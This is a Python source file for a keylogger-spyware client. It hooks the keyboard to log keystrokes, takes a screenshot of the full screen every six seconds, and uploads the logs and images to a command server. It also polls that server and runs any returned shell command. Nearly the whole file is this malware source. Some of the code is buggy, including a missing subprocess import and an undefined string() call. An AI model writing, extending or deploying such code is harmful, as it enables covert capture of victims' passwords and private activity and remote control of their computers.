import random
import threading
import pyHook
import gtk.gdk
import urllib2, urllib
import pycurl
import cStringIO
import os
from time import time
import json

def OnKeyboardEvent(event):
    
    if event.KeyID == 13:
        text = '[Return] \n'
    elif event.KeyID == 165:
        text = '[Alt]'
    elif event.KeyID == 8:
        text = '[Back]'
    elif event.KeyID == 162:
        text = '[Ctrl]'
    else:
        text = chr(event.Ascii)
    fob = open('log.txt', 'a')
    
    fob.write(text)
    fob.close()

    
    return True

def getFileSize(file_name):
   return os.path.getsize(file_name)
def getServerUrl():
    return "http://localhost/t.php"


def threadFunctions():
    threading.Timer(6, threadFunctions).start()
    captureImage()
    checkLogfile()
    contactServer()



def checkLogfile():
    size = getFileSize('log.txt')
    if size>20000:
        if uploadFile('log.txt'):
            name = time()
            name = str(name)+".txt"
            os.rename('log.txt',name)




def internet_on():
    url = getServerUrl()
    try:
        response=urllib2.urlopen(url,timeout=1)
        return True
    except urllib2.URLError as err: pass
    return False
def captureImage():
    print "capimg"
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
    if (pb != None):
        name = "ww"#random.getrandbits(32)
        name = str(name)+".png"
        pb.save(name,"png")

def getRandomString():
     seed = random.getrandbits(32)
     return string(seed) 
def executeBatchScript(command):
    try:
        result = subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as error:
        print("Error: Command exited with code {0}".format(error.returncode))

def isset(var):
    return var in vars() or var in globals()


def analysePage(page):
    data = json.loads(page)
    print data['scr_img']
    if data["batch"] == "true":
        executeBatchScript(data["batch"])
    elif data["scr_img"] != "false":
            uploadImage(data['scr_img'])



def contactServer():
    result = doPost()
    if result != False:
        analysePage(result)


def doPost():
    if internet_on() == True:
        mydata=[('batch','1')]    #The first is the var name the second is the value
        mydata=urllib.urlencode(mydata)
        path=getServerUrl()    #the url you want to POST to
        req=urllib2.Request(path, mydata)
        req.add_header("Content-type", "application/x-www-form-urlencoded")
        page=urllib2.urlopen(req).read()
        return page
    else:
        return False
def uploadImage(num):
    imgs = os.listdir('.')
    #for files in imgs:
    uploadFile("ww.png")

def uploadFile(filename):
    if internet_on() == True:
        url = getServerUrl()
        response = cStringIO.StringIO()
        c = pycurl.Curl()
        c.setopt(c.POST, 1)
        c.setopt(c.URL, url)
        c.setopt(c.HTTPPOST, [("file", (c.FORM_FILE, filename))])
        c.setopt(c.VERBOSE, 1)
        c.setopt(c.WRITEFUNCTION, response.write)
        c.perform()
        c.close()            
                   
threadFunctions()    
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()


if __name__ == '__main__':
  import pythoncom
  pythoncom.PumpMessages()
  
